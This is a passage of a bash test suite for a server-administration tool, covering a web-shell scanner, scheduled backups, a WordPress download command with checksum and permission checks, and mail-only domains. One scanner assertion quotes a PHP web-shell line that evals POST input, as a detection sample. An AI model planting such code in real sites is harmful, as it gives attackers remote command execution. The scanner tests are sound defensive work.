assert_has "and the text there" '            @eval ( $_POST["c"] );' "$_out"
assert_has "a finding that has no line is shown without one" "          a script in an upload directory" "$_out"
assert_has "the site's counts" "sc1.example.com: 9 file(s) with strong signs of a web shell, 8 more worth a look" "$_out"
assert_has "a clean site says so" "sc2.example.com: nothing found in 0 files" "$_out"
assert_has "what a match means is said once" "A match is a reason to open the file, not a verdict" "$_out"
_first_look="$(grep -n '  LOOK    ' "$TMP/sc-out" | head -1 | cut -d: -f1)"; _last_strong="$(grep -n '  STRONG  ' "$TMP/sc-out" | tail -1 | cut -d: -f1)"
assert_true "strong findings come before the rest" test "$_last_strong" -lt "$_first_look"
_out="$(OPT_QUIET=0; lib_scan_main sc2.example.com 2>&1)"
assert_lacks "a clean run has no advice to give" "A match is a reason" "$_out"
assert_false "a site that is not registered is refused" bash -c "$(declare -f lib_scan_main lib_scan_usage lib_domain_valid lib_domain_registered lib_domain_json lib_die 2>/dev/null); STATE_DIR='$STATE_DIR'; lib_scan_main nosuch.example.com >/dev/null 2>&1"
assert_false "--all and a domain together are refused" bash -c "$(declare -f lib_scan_main lib_scan_usage lib_die 2>/dev/null); lib_scan_main --all sc1.example.com >/dev/null 2>&1"
assert_has "setup.sh has the command" 'scan)           lib_scan_main' "$(cat "$ROOT/setup.sh")"
assert_has "it takes no lock: it only reads" 'list|status|doctor|credentials|logs|menu|scan) ;;' "$(cat "$ROOT/setup.sh")"
assert_has "the menu offers it"       '24) _menu_scan' "$(cat "$ROOT/lib/menu.sh")"
assert_has "and the command reference" 'scan <domain>|--all [--wide]' "$(lib_usage)"
STATE_DIR="$_sc_state"; unset -f _sc_file _sc_sum; eval "$_sc_saved"

section "backup --schedule: automatic backups after the installation"
lib_require_tools() { return 0; }; lib_require_installed() { return 0; }
lib_cron_remove backup
( lib_backup_main --schedule "daily 02:30" --keep 14 --no-mail ) >/dev/null 2>&1
assert_has "the cron entry, with the options given" "30 2 * * * root $BIN_LINK backup --all --yes --quiet --keep 14 --no-mail # server-setup:backup" "$(cat "$CRON_FILE")"
assert_eq  "the schedule is recorded"   "daily 02:30"         "$(lib_manifest_get '.backup.schedule')"
assert_eq  "and its options"            "--keep 14 --no-mail" "$(lib_manifest_get '.backup.schedule_flags')"
( lib_backup_main --schedule "weekly sat 04:05" ) >/dev/null 2>&1
assert_eq  "a new schedule replaces the old one" 1 "$(grep -c 'server-setup:backup$' "$CRON_FILE")"
assert_has "weekly"                     "5 4 * * 6 root $BIN_LINK backup --all --yes --quiet  # server-setup:backup" "$(cat "$CRON_FILE")"
assert_false "a schedule for one site is refused" bash -c "$(declare -f lib_backup_main lib_require_tools lib_require_installed lib_die 2>/dev/null); BACKUP_KEEP=7; lib_backup_main example.com --schedule hourly >/dev/null 2>&1"
assert_false "a tag is refused"         bash -c "$(declare -f lib_backup_main lib_require_tools lib_require_installed lib_die 2>/dev/null); BACKUP_KEEP=7; lib_backup_main --schedule hourly --tag x >/dev/null 2>&1"
assert_false "and --schedule with nothing after it" bash -c "$(declare -f lib_backup_main lib_require_tools lib_require_installed lib_die 2>/dev/null); BACKUP_KEEP=7; lib_backup_main --schedule >/dev/null 2>&1"
assert_true  "none of which touched the entry" lib_cron_has backup
( lib_backup_main --schedule off ) >/dev/null 2>&1
assert_false "off removes the entry"    lib_cron_has backup
assert_eq  "and the record of it"       "" "$(lib_manifest_get '.backup.schedule')$(lib_manifest_get '.backup.schedule_flags')"
assert_has "the menu offers it"         "_menu_opt 3 \"\$(_menu_tf 'Automatic backups" "$(declare -f _menu_backup)"
assert_has "and the command reference"  '--schedule "daily 03:00"' "$(lib_usage)"

# =============================================================================
section "wordpress: the files of the latest release, into a site that is there"
# Root downloads wordpress.org/latest.zip and checks it; the site's user unpacks it and copies
# it into the document root. Here curl is a function that hands out a small stand-in archive -
# built by hand, with modes no site should end up with - and its checksum. unzip, find and cp
# are the real ones, run through the suite's runuser.
_wp_saved="$(declare -p STATE_DIR DOM_FIX_OWNER_PATH DOM_HARDLINKS_SYSCTL DOM_MOUNTINFO OPT_YES)"
_wp_orig_ids="$(declare -f _domain_fix_owner_ids)"; _wp_orig_list="$(declare -f lib_domains_list)"
_wp_orig_apt="$(declare -f lib_apt_install)"
STATE_DIR="$TMP/wp-state"; mkdir -p "$STATE_DIR"
_wp_zip="$TMP/wp-fixture.zip"; _wp_out="$TMP/wp-out"; _wp_curl="$TMP/wp-curl.log"; _wp_chown="$TMP/wp-chown.log"
base64 -d >"$_wp_zip" <<'EOF'
UEsDBBQAAAAAAAAAIVwAAAAAAAAAAAAAAAAKAAAAd29yZHByZXNzL1BLAwQUAAAAAAAAACFc9fY8Dh4AAAAeAAAAEwAAAHdvcmRw
cmVzcy9pbmRleC5waHA8P3BocCAvLyB0aGUgZnJvbnQgY29udHJvbGxlcgpQSwMEFAAAAAAAAAAhXD94IvcEAAAABAAAABUAAAB3
b3JkcHJlc3MvbGljZW5zZS50eHRHUEwKUEsDBBQAAAAAAAAAIVwAAAAAAAAAAAAAAAATAAAAd29yZHByZXNzL3dwLWFkbWluL1BL
AwQUAAAAAAAAACFcH0JckQ8AAAAPAAAAIwAAAHdvcmRwcmVzcy93cC1hZG1pbi9zZXR1cC1jb25maWcucGhwPD9waHAgLy8gc2V0
dXAKUEsDBBQAAAAAAAAAIVwAAAAAAAAAAAAAAAAWAAAAd29yZHByZXNzL3dwLWluY2x1ZGVzL1BLAwQUAAAAAAAAACFcdwHOeh0A
AAAdAAAAIQAAAHdvcmRwcmVzcy93cC1pbmNsdWRlcy92ZXJzaW9uLnBocDw/cGhwCiR3cF92ZXJzaW9uID0gJzkuOC43JzsKUEsD
BBQAAAAAAAAAIVwDN2ZCCAAAAAgAAAAnAAAAd29yZHByZXNzL3dwLWNvbnRlbnQvdGhlbWVzL3Qvc3R5bGUuY3NzLyogdCAqLwpQ
SwECFAMUAAAAAAAAACFcAAAAAAAAAAAAAAAACgAAAAAAAAAAABAAwEEAAAAAd29yZHByZXNzL1BLAQIUAxQAAAAAAAAAIVz19jwO
HgAAAB4AAAATAAAAAAAAAAAAAACAgSgAAAB3b3JkcHJlc3MvaW5kZXgucGhwUEsBAhQDFAAAAAAAAAAhXD94IvcEAAAABAAAABUA
AAAAAAAAAAAAAP+BdwAAAHdvcmRwcmVzcy9saWNlbnNlLnR4dFBLAQIUAxQAAAAAAAAAIVwAAAAAAAAAAAAAAAATAAAAAAAAAAAA
EAD/Qa4AAAB3b3JkcHJlc3Mvd3AtYWRtaW4vUEsBAhQDFAAAAAAAAAAhXB9CXJEPAAAADwAAACMAAAAAAAAAAAAAAO2B3wAAAHdv
cmRwcmVzcy93cC1hZG1pbi9zZXR1cC1jb25maWcucGhwUEsBAhQDFAAAAAAAAAAhXAAAAAAAAAAAAAAAABYAAAAAAAAAAAAQAO1B
LwEAAHdvcmRwcmVzcy93cC1pbmNsdWRlcy9QSwECFAMUAAAAAAAAACFcdwHOeh0AAAAdAAAAIQAAAAAAAAAAAAAApIFjAQAAd29y
ZHByZXNzL3dwLWluY2x1ZGVzL3ZlcnNpb24ucGhwUEsBAhQDFAAAAAAAAAAhXAM3ZkIIAAAACAAAACcAAAAAAAAAAAAAAKCBvwEA
AHdvcmRwcmVzcy93cC1jb250ZW50L3RoZW1lcy90L3N0eWxlLmNzc1BLBQYAAAAACAAIADYCAAAMAgAAAAA=
EOF
_wp_sha="$(sha1sum "$_wp_zip" | cut -d' ' -f1)"
_wp_sha_served="$_wp_sha"; _wp_net_down=0
# curl the way the command calls it: "-o FILE" somewhere, the address last
eval 'lib_require_tools() { return 0; }
      lib_apt_install() { return 1; }
      _domain_fix_owner_ids() { printf "%s" "$_wp_ids"; }
      curl() {
        local out="" url="" a=""
        while (($# > 0)); do a="$1"; shift; if [[ "$a" == "-o" ]]; then out="$1"; shift; else url="$a"; fi; done
        printf "%s\n" "$url" >>"$_wp_curl"
        if (( _wp_net_down )); then return 6; fi
        case "$url" in
          https://wordpress.org/latest.zip)      cp "$_wp_zip" "$out" ;;
          https://wordpress.org/latest.zip.sha1) printf "%s" "$_wp_sha_served" >"$out" ;;
          *) return 22 ;;
        esac
      }'
eval "$(sed -n '/^lib_domains_list() {/,/^}/p' "$ROOT/lib/common.sh")"
# the command run the way setup.sh runs it (errexit armed); prints the exit status, and the
# output goes to $_wp_out
_wpf() {
  local rc=0 prev=""
  prev="$(trap -p ERR || true)"
  trap - ERR
  set +e
  ( set -Eeuo pipefail; shopt -s lastpipe; OPT_QUIET=0; lib_domain_wordpress_main "$@" ) >"$_wp_out" 2>&1
  rc=$?
  set -e
  [[ -z "$prev" ]] || eval "$prev"
  printf '%s' "$rc"
}
_wp_site() {   # domain mode
  lib_domain_state_reset
  D_DOMAIN="$1"; D_IDENT="$(lib_domain_ident "$1")"; D_USER="$D_IDENT"; D_GROUP="$D_IDENT"
  D_HOME="$SITES_ROOT/$1"; D_MODE="$2"; D_PHP="8.3"; D_STATUS="active"
  lib_domain_state_save
  mkdir -p "$D_HOME/public_html" "$D_HOME/private/tmp"
}
_wp_site wp1.example.com php
_wp_site wps.example.com static
_wp_h="$SITES_ROOT/wp1.example.com"; _wp_d="$_wp_h/public_html"
read -r _wp_u _wp_g < <(stat -c '%u %g' "$_wp_d")
_wp_ids="${_wp_u} ${_wp_g}"   # everything there is the site's own
# the page a new site starts with
assert_has "a new site's page carries the sentence the command knows it by" '${DOMAIN_PLACEHOLDER_MARK}' "$(declare -f lib_domain_dirs_create)"
printf '<body><p>This site was %s.</p></body>\n' "$DOMAIN_PLACEHOLDER_MARK" >"$_wp_d/index.html"
: >"$_wp_curl"

assert_eq  "no domain is an error"               1 "$(_wpf)"
assert_has "which says so"                       "Domain missing" "$(cat "$_wp_out")"
assert_eq  "an unknown option is refused"        1 "$(_wpf wp1.example.com --force)"
assert_eq  "and a second site"                   1 "$(_wpf wp1.example.com wps.example.com)"
assert_eq  "a name that is no domain too"        1 "$(_wpf ../etc)"
assert_eq  "a site that is not registered too"   1 "$(_wpf nosuch.example.com)"
assert_has "with the command that adds it"       "setup.sh add nosuch.example.com" "$(cat "$_wp_out")"
assert_eq  "a static site cannot run WordPress"  1 "$(_wpf wps.example.com)"
assert_has "and is told why"                     "it is a static site: no PHP runs there" "$(cat "$_wp_out")"
assert_eq  "help exits 0"                        0 "$(_wpf --help)"
OPT_DRY_RUN=1
assert_eq  "a dry run exits 0"                   0 "$(_wpf wp1.example.com)"
assert_has "and says what a real run would do"   "[dry-run] would download https://wordpress.org/latest.zip and unpack it into" "$(cat "$_wp_out")"
OPT_DRY_RUN=0
assert_eq  "none of this went to the network"    "" "$(cat "$_wp_curl")"
assert_eq  "or touched the site"                 "index.html" "$(ls -A "$_wp_d")"

if command -v unzip >/dev/null 2>&1; then
  _wp_sha_served="0000000000000000000000000000000000000000"
  assert_eq  "an archive that does not match its checksum is refused" 1 "$(_wpf wp1.example.com)"
  assert_has "by name"                             "WordPress checksum mismatch" "$(cat "$_wp_out")"
  _wp_sha_served="<html>not a checksum</html>"
  assert_eq  "so is one whose checksum is no checksum" 1 "$(_wpf wp1.example.com)"
  _wp_sha_served="$_wp_sha"; _wp_net_down=1
  assert_eq  "a download that fails is an error"   1 "$(_wpf wp1.example.com)"
  assert_has "and the end of the run"              "FAILED: WordPress download failed" "$(cat "$_wp_out")"
  _wp_net_down=0
  # checked, but not what wordpress.org publishes: it gets as far as the working directory
  printf 'this is not an archive\n' >"$TMP/wp-not-a-zip"
  _wp_good_zip="$_wp_zip"; _wp_zip="$TMP/wp-not-a-zip"; _wp_sha_served="$(sha1sum "$_wp_zip" | cut -d' ' -f1)"
  assert_eq  "an archive that cannot be unpacked is an error" 1 "$(_wpf wp1.example.com)"
  assert_has "named as such"                       "The WordPress archive could not be unpacked" "$(cat "$_wp_out")"
  # ... and a sound archive of something else
  base64 -d >"$TMP/wp-other.zip" <<'EOF'
UEsDBBQAAAAAAAAAIVxNHSRmDgAAAA4AAAAQAAAAb3RoZXIvcmVhZG1lLnR4dG5vdCBXb3JkUHJlc3MKUEsBAhQDFAAAAAAAAAAh
XE0dJGYOAAAADgAAABAAAAAAAAAAAAAAAKSBAAAAAG90aGVyL3JlYWRtZS50eHRQSwUGAAAAAAEAAQA+AAAAPAAAAAAA
EOF
  _wp_zip="$TMP/wp-other.zip"; _wp_sha_served="$(sha1sum "$_wp_zip" | cut -d' ' -f1)"
  assert_eq  "so is an archive that holds something else" 1 "$(_wpf wp1.example.com)"
  assert_has "said the same way"                   "The WordPress archive could not be unpacked" "$(cat "$_wp_out")"
  _wp_zip="$_wp_good_zip"; _wp_sha_served="$_wp_sha"
  assert_eq  "after all of which the site is as it was" "index.html" "$(ls -A "$_wp_d")"
  assert_eq  "and its private/tmp empty: the working directory is taken away again" "" "$(ls -A "$_wp_h/private/tmp")"

  printf 'DB_NAME=wp1_db\nDB_USER=wp1_user\nDB_PASS=Wp1DbPassw0rdForTheTest\n' >"$STATE_DIR/domains/wp1.example.com/db.info"
  mkdir -p "$_wp_h/private/tmp/.lomp-wordpress.abcdef"; printf 'x' >"$_wp_h/private/tmp/.lomp-wordpress.abcdef/left-behind"
  printf 'upload' >"$_wp_h/private/tmp/phpA1b2C3"
  lib_cron_remove htaccess
  : >"$RUNUSER_LOG"; : >"$_wp_curl"
  assert_eq  "a new site gets WordPress"           0 "$(_wpf wp1.example.com)"
  _wp_o="$(cat "$_wp_out")"; _wp_ru="$(cat "$RUNUSER_LOG")"
  assert_eq  "the archive is fetched, then its checksum" $'https://wordpress.org/latest.zip\nhttps://wordpress.org/latest.zip.sha1' "$(cat "$_wp_curl")"
  assert_true  "its front controller is in the document root itself" test -f "$_wp_d/index.php"
  assert_true  "with what lies deeper"             test -f "$_wp_d/wp-content/themes/t/style.css"
  assert_false "and not inside a wordpress/ there" test -e "$_wp_d/wordpress"
  assert_false "the page the site started with is gone" test -e "$_wp_d/index.html"
  assert_eq  "the working directory is gone, with the one an interrupted run left" "phpA1b2C3" "$(ls -A "$_wp_h/private/tmp")"
  if (( CAN_CHMOD )); then
    assert_eq "every directory is 0755, whatever the archive said" "" "$(find "$_wp_d" -type d ! -perm 0755)"
    assert_eq "and every file 0644"                "" "$(find "$_wp_d" -type f ! -perm 0644)"
  fi
  assert_has "it is unpacked as the site's user"   "-u wp1_example_com -- env -C / unzip -q -o " "$_wp_ru"
  assert_has "and copied as the site's user"       "-u wp1_example_com -- env -C / cp -a --remove-destination -- " "$_wp_ru"
  assert_lacks "lomp's own page is nothing to ask about" "already holds" "$_wp_o"
  assert_has "the version is named"                "WordPress 9.8.7 is in place" "$_wp_o"
  assert_has "and where to finish the installation" "http://wp1.example.com/" "$_wp_o"
  assert_has "with the database the installer asks for" "wp1_db" "$_wp_o"
  assert_has "its user"                            "wp1_user" "$_wp_o"
  assert_has "and the password"                    "Wp1DbPassw0rdForTheTest" "$_wp_o"
  assert_eq  "which stays out of the log"          0 "$(grep -c 'Wp1DbPassw0rdForTheTest' "$LOG_FILE" || true)"
  assert_has "and that its wp-config.php will be closed" "goes to 0640 by itself within a minute of the installation" "$_wp_o"
  assert_has "and the check that does it runs every minute" "* * * * * root $BIN_LINK htaccess-check --quiet # server-setup:htaccess" "$(cat "$CRON_FILE")"

  # a document root that holds something: asked about first, and only the same names replaced
  printf 'mine\n' >"$_wp_d/own.txt"; printf 'old\n' >"$_wp_d/index.php"; printf '<h1>my own page</h1>\n' >"$_wp_d/index.html"
  rm -f "$STATE_DIR/domains/wp1.example.com/db.info"
  lib_json_set "$(lib_domain_json wp1.example.com)" '.ssl.enabled = true | .www = true | .www_primary = true'
  OPT_YES=0; : >"$_wp_curl"
  assert_eq  "a document root that holds something is asked about, and no answer is a no" 1 "$(_wpf wp1.example.com)"
  assert_has "it says how much is there"           "already holds 7 files and directories" "$(cat "$_wp_out")"
  assert_has "and that it was not confirmed"       "not confirmed" "$(cat "$_wp_out")"
  assert_eq  "before anything is downloaded"       "" "$(cat "$_wp_curl")"
  assert_eq  "or replaced"                         "old" "$(cat "$_wp_d/index.php")"
  OPT_YES=1
  assert_eq  "with --yes it goes ahead"            0 "$(_wpf wp1.example.com)"
  _wp_o="$(cat "$_wp_out")"
  assert_eq  "a file of the same name is replaced" "<?php // the front controller" "$(cat "$_wp_d/index.php")"
  assert_eq  "one with another name stays"         "mine" "$(cat "$_wp_d/own.txt")"
  assert_eq  "an index.html of somebody's own too" "<h1>my own page</h1>" "$(cat "$_wp_d/index.html")"
  assert_has "https and www where the site answers there" "https://www.wp1.example.com/" "$_wp_o"
  assert_has "a site without a database is told how to get one" "setup.sh db wp1.example.com" "$_wp_o"

  # an installed WordPress is not this command's to touch
  printf '<?php // config\n' >"$_wp_d/wp-config.php"; : >"$_wp_curl"
  assert_eq  "a site that has a wp-config.php is left alone" 1 "$(_wpf wp1.example.com)"
  assert_has "and told why"                        "WordPress is already installed" "$(cat "$_wp_out")"
  assert_eq  "nothing is downloaded for it"        "" "$(cat "$_wp_curl")"
  rm -f "$_wp_d/wp-config.php"

  # what root uploaded: the numbers now say none of it is the site's. fix-owner runs first, and
  # the chown here changes nothing, so the hand-over cannot finish and the run stops there.
  _wp_bin="$TMP/wp-bin"; mkdir -p "$_wp_bin"
  cat >"$_wp_bin/chown" <<EOF
#!/bin/sh
printf 'chown %s\n' "\$1 \$2 \$3" >>"${_wp_chown}"
EOF
  chmod 0755 "$_wp_bin/chown"
  DOM_FIX_OWNER_PATH="${_wp_bin}:/usr/bin:/bin"
  DOM_HARDLINKS_SYSCTL="$TMP/wp-hardlinks"; printf '1\n' >"$DOM_HARDLINKS_SYSCTL"
  DOM_MOUNTINFO="$TMP/wp-mountinfo"; : >"$DOM_MOUNTINFO"
  _wp_ids="$(( _wp_u + 1 )) ${_wp_g}"; : >"$_wp_curl"; : >"$_wp_chown"
  assert_eq  "files that are someone else's are handed over first, and a hand-over that fails stops the run" 1 "$(_wpf wp1.example.com)"
  _wp_o="$(cat "$_wp_out")"
  assert_has "it says that fix-owner runs"         "'fix-owner wp1.example.com' runs first" "$_wp_o"
  assert_has "chown ran, for the site's user"      "chown -h -- wp1_example_com:wp1_example_com" "$(cat "$_wp_chown")"
  assert_has "and why the run stopped"             "could not all be handed to wp1_example_com" "$_wp_o"
  assert_eq  "before anything is downloaded"       "" "$(cat "$_wp_curl")"
  printf '0\n' >"$DOM_HARDLINKS_SYSCTL"; : >"$_wp_chown"
  assert_eq  "without protected hard links nothing is handed over" 1 "$(_wpf wp1.example.com)"
  assert_has "which is said"                       "fs.protected_hardlinks is off" "$(cat "$_wp_out")"
  assert_eq  "and chown never runs"                "" "$(cat "$_wp_chown")"
  # asked about even where nothing would be replaced: a site that holds lomp's page alone
  _wp_site wp2.example.com php
  printf '<body><p>This site was %s.</p></body>\n' "$DOMAIN_PLACEHOLDER_MARK" >"$SITES_ROOT/wp2.example.com/public_html/index.html"
  OPT_YES=0; printf '1\n' >"$DOM_HARDLINKS_SYSCTL"
  assert_eq  "the hand-over is asked about as well" 1 "$(_wpf wp2.example.com)"
  assert_has "and no answer is a no"               "not confirmed" "$(cat "$_wp_out")"
  assert_eq  "so nothing is handed over"           "" "$(cat "$_wp_chown")"
  OPT_YES=1
else
  printf '   (unzip is not installed here: the runs that unpack the archive were skipped)\n'
fi

# WordPress's installer writes its wp-config.php 0666, in a site this command set up and in one
# somebody uploaded alike. The check cron runs every minute closes the one in the document root
# of every PHP and WordPress site to 0640, as the site's user, where the file is that user's.
_wp_ids="${_wp_u} ${_wp_g}"
_wp_site wp3.example.com php
_wp_c="$SITES_ROOT/wp3.example.com/public_html/wp-config.php"
_wp_pass() { run_isolated lib_domain_wp_config_close; }
_wp_mode() { stat -c %a "$_wp_c"; }
: >"$RUNUSER_LOG"
assert_eq  "a pass over sites that have no wp-config.php exits 0" 0 "$(_wp_pass)"
assert_eq  "and runs nothing"                    "" "$(cat "$RUNUSER_LOG")"
if (( CAN_CHMOD )); then
  printf '<?php // written by the installer\n' >"$_wp_c"; chmod 0666 "$_wp_c"
  OPT_DRY_RUN=1
  assert_eq  "a dry run closes nothing"            "0 666" "$(_wp_pass) $(_wp_mode)"
  OPT_DRY_RUN=0
  assert_eq  "the wp-config.php the installer left 0666 is closed to 0640" "0 640" "$(_wp_pass) $(_wp_mode)"
  assert_has "by the site's user"                  "-u wp3_example_com -- env -C / chmod 0640 " "$(cat "$RUNUSER_LOG")"
  assert_has "and the log says so"                 "wp-config.php of wp3.example.com closed to 0640 (it was 666)" "$(cat "$LOG_FILE")"
  : >"$RUNUSER_LOG"
  assert_eq  "a pass that finds it closed exits 0" 0 "$(_wp_pass)"
  assert_eq  "and runs nothing"                    "" "$(cat "$RUNUSER_LOG")"
  chmod 0666 "$_wp_c"   # the installer's own chmod, landing after a pass
  assert_eq  "opened again, it is closed again"    "0 640" "$(_wp_pass) $(_wp_mode)"
  chmod 0644 "$_wp_c"
  assert_eq  "one that others can only read is closed as well" "0 640" "$(_wp_pass) $(_wp_mode)"
  : >"$RUNUSER_LOG"
  for _m in 600 400 440; do
    chmod "0${_m}" "$_wp_c"
    assert_eq "a file closed further (0${_m}) is not opened up" "0 ${_m}" "$(_wp_pass) $(_wp_mode)"
  done
  assert_eq  "nothing is run for those"            "" "$(cat "$RUNUSER_LOG")"
  # a file that is not the site's own: closed as somebody else's, PHP could no longer read it.
  # What root uploaded has become the site's by then (the fix-owner section has that pass)
  chmod 0666 "$_wp_c"; _wp_ids="$(( _wp_u + 1 )) ${_wp_g}"; : >"$RUNUSER_LOG"
  assert_eq  "a file that is not the site user's is left as it is" "0 666" "$(_wp_pass) $(_wp_mode)"
  _wp_ids="its user wp3_example_com does not exist"
  eval '_domain_fix_owner_ids() { printf "%s" "$_wp_ids"; [[ "$_wp_ids" == [0-9]* ]]; }'
  assert_eq  "so is the file of a site whose account is not a site's" "0 666" "$(_wp_pass) $(_wp_mode)"
  assert_eq  "with nothing run for either"         "" "$(cat "$RUNUSER_LOG")"
  _wp_ids="${_wp_u} ${_wp_g}"
  # only where PHP runs
  for _m in static proxy; do
    lib_json_set "$(lib_domain_json wp3.example.com)" '.mode = $m' --arg m "$_m"
    assert_eq "a wp-config.php in a ${_m} site is not looked at" "0 666" "$(_wp_pass) $(_wp_mode)"
  done
  lib_json_set "$(lib_domain_json wp3.example.com)" '.mode = "wordpress"'
  assert_eq  "one in a site added with --wordpress is" "0 640" "$(_wp_pass) $(_wp_mode)"
  lib_json_set "$(lib_domain_json wp3.example.com)" '.mode = "php"'
  # every site in one pass, whichever way WordPress got there
  chmod 0666 "$_wp_c"; printf '<?php // uploaded\n' >"$_wp_d/wp-config.php"; chmod 0666 "$_wp_d/wp-config.php"
  assert_eq  "every site's is closed in the same pass" "0 640 640" "$(_wp_pass) $(_wp_mode) $(stat -c %a "$_wp_d/wp-config.php")"
  rm -f "$_wp_d/wp-config.php"
  # a chmod that fails is tried again in a minute: said every time, it would fill the log
  chmod 0666 "$_wp_c"
  _wp_r="$( ( eval 'lib_domain_as_user() { return 1; }'; OPT_QUIET=0; lib_domain_wp_config_close; printf 'rc=%s' "$?" ) 2>&1 )"
  assert_eq  "a chmod that fails is not reported, and the pass still exits 0" "rc=0" "$_wp_r"
  # the minute check is what runs it, and not while another command holds the lock
  ( eval 'flock() { return 1; }; lib_ols_htaccess_pending() { return 0; }'; lib_ols_htaccess_check_main ) >/dev/null 2>&1 || true
  assert_eq  "the minute check leaves it while another command holds the lock" "666" "$(_wp_mode)"
  ( eval 'flock() { return 0; }; lib_ols_htaccess_pending() { return 0; }'; lib_ols_htaccess_check_main ) >/dev/null 2>&1 || true
  assert_eq  "and closes it otherwise"             "640" "$(_wp_mode)"
  if (( CAN_SYMLINK )); then
    rm -f "$_wp_c"; printf 'elsewhere\n' >"$TMP/wp-elsewhere"; chmod 0666 "$TMP/wp-elsewhere"; ln -s "$TMP/wp-elsewhere" "$_wp_c"
    assert_eq  "a wp-config.php that is a link is not followed" "0 666" "$(_wp_pass) $(stat -c %a "$TMP/wp-elsewhere")"
    rm -f "$_wp_c"
  fi
fi
mv "$STATE_DIR/domains/wp3.example.com/domain.json" "$TMP/wp3-domain.json"; : >"$STATE_DIR/domains/wp3.example.com/domain.json"
assert_eq  "a site whose state cannot be read is passed over" 0 "$(_wp_pass)"
mv "$TMP/wp3-domain.json" "$STATE_DIR/domains/wp3.example.com/domain.json"

# the menu: item 25, for a site PHP runs in
_mwp() {   # -> the command the menu runs
  (
    eval '_menu_run() { printf "%s\n" "$*"; }
          _menu_pick_domain() { printf "picked.example.com"; }
          _menu_pause() { :; }'
    _menu_wordpress 2>/dev/null | tail -n 1
  )
}
assert_eq  "the menu runs it for the site that was picked" "wordpress picked.example.com" "$(_mwp)"
assert_has "and offers only the sites PHP runs in"  '_menu_pick_domain php' "$(declare -f _menu_wordpress)"
for _c in "php|php" "wp|wordpress" "static|static" "node|proxy"; do
  mkdir -p "$TMP/wp-state2/domains/${_c%%|*}.example.com"
  printf '{"mode":"%s"}\n' "${_c##*|}" >"$TMP/wp-state2/domains/${_c%%|*}.example.com/domain.json"
done
mkdir -p "$TMP/wp-state2/domains/plain.example.com"; printf '{}\n' >"$TMP/wp-state2/domains/plain.example.com/domain.json"
assert_eq  "which leaves static and proxy sites out" "php.example.com plain.example.com wp.example.com " \
  "$(STATE_DIR="$TMP/wp-state2"; _menu_domains php | tr '\n' ' ')"
assert_eq  "every other entry still offers every site" "node.example.com php.example.com plain.example.com static.example.com wp.example.com " \
  "$(STATE_DIR="$TMP/wp-state2"; _menu_domains | tr '\n' ' ')"
assert_has "the question lists what that gives"  '_menu_domains "$only"' "$(declare -f _menu_pick_domain)"
_menu_block="$(awk '/_menu_group "SITES"/{f=1} f{print} f && /^[[:space:]]*esac/{exit}' "$ROOT/lib/menu.sh")"
assert_has "it is item 25 of the main menu"      '_menu_item 25 "Download WordPress into a site (you finish the setup in the browser)"' "$_menu_block"
assert_has "which opens it"                      '25) _menu_wordpress ;;' "$_menu_block"
assert_has "the command is dispatched"           'wordpress)      lib_domain_wordpress_main "${rest[@]}" ;;' "$(cat "$ROOT/setup.sh")"
assert_has "and in the command reference"        "wordpress <domain>" "$(lib_usage)"

eval "$_wp_saved"; eval "$_wp_orig_ids"; eval "$_wp_orig_list"; eval "$_wp_orig_apt"
unset -f curl _wpf _wp_site _mwp _wp_pass _wp_mode
rm -rf "$_wp_h" "$SITES_ROOT/wps.example.com" "$SITES_ROOT/wp2.example.com" "$SITES_ROOT/wp3.example.com"
lib_domain_state_reset

# =============================================================================
section "mail domains: a domain that has its mail here and no site here"
# The mail module was written for the sites of one server. A domain whose web site lives
# somewhere else - or a server that carries nothing but mail - needs the same mailboxes,
# aliases, keys and certificates without the Linux user, the home and the virtual host a site
# brings. Such a domain has a record of its own, apart from the sites' registry, so that
# nothing which walks the sites ever meets one.
_md="$TMP/maildom"; rm -rf "$_md"; mkdir -p "$_md"
_md_saved_fn="$(declare -f lib_domains_list)"
eval "$(sed -n '/^lib_domains_list() {/,/^}/p' "$ROOT/lib/common.sh")"
_md_saved_vars="$(declare -p STATE_DIR MAIL_STATE_DIR MAIL_DOMAINS_DIR MAIL_DOMAINS_GONE_DIR MAIL_ALIAS_DIR MAIL_DISABLED_DIR MAIL_PASSWD_FILE MAIL_DKIM_DIR MAIL_RSPAMD_DIR MAIL_VMAIL_HOME BACKUP_ROOT BACKUP_KEY_FILE WM_CURRENT WM_CONF WM_IDENT_MAP INS_ROLE DB_BUFFER_PERCENT REDIS_MAX_PERCENT)"
STATE_DIR="$_md/state"; mkdir -p "$STATE_DIR/domains"
lib_state_init
MAIL_STATE_DIR="$_md/mailstate"; MAIL_DOMAINS_DIR="$MAIL_STATE_DIR/domains"; MAIL_DOMAINS_GONE_DIR="$_md/gone"
MAIL_ALIAS_DIR="$MAIL_STATE_DIR/aliases"; MAIL_DISABLED_DIR="$MAIL_STATE_DIR/disabled"
MAIL_PASSWD_FILE="$_md/passwd"; MAIL_DKIM_DIR="$_md/dkim"; MAIL_VMAIL_HOME="$_md/vmail"
BACKUP_ROOT="$_md/backups"; BACKUP_KEY_FILE="$_md/backup.key"; INS_ROLE=""
mkdir -p "$MAIL_ALIAS_DIR" "$MAIL_DKIM_DIR" "$MAIL_VMAIL_HOME" "$BACKUP_ROOT"
_md_hash='{BLF-CRYPT}$2y$05$abcdefghijklmnopqrstuv'
# What needs a mail server to be there is stood in for. Everything that decides what the state
# and the tables say is the real code.
_md_stubs='lib_mail_installed() { return 0; }
  lib_mail_dkim_ensure() { return 0; }
  lib_mail_tables_apply() { return 0; }
  lib_mail_domain_cert_ensure() { return 0; }
  lib_mail_dns_print() { return 0; }
  lib_cf_token() { printf ""; }
  lib_require_tools() { return 0; }
  sleep() { return 0; }
  lib_webmail_user_forget() { return 0; }
  _mail_sendas_current() { printf "x\n" >>"$_md/sendas.log"; return 0; }
  lib_mail_backup_domain() { printf "%s\n" "$*" >>"$_md/backup.log"; MAIL_LAST_ERROR="no room"; return "${_md_backup_rc:-0}"; }'
_md_do()  { eval "$_md_stubs"; "$@"; }                    # under run_isolated: the status is the answer
_md_run() { ( _md_do "$@" ) >/dev/null 2>&1 || true; }    # where it is expected to work

mkdir -p "$STATE_DIR/domains/site.example"
printf '{"domain":"site.example","mail":{"enabled":true,"selector":"lomp202601"}}\n' >"$(lib_domain_json site.example)"
lib_mail_domain_register own.example
assert_true  "a mail domain has a record of its own"   lib_mail_domain_standalone own.example
assert_false "and is no site"                           lib_domain_registered own.example
assert_eq    "so nothing that walks the sites meets it" "site.example" "$(lib_domains_list | tr '\n' ' ' | sed 's/ $//')"
assert_eq    "the record says what it is"               "mail" "$(jq -r '.kind' "$(lib_mail_domain_file own.example)")"
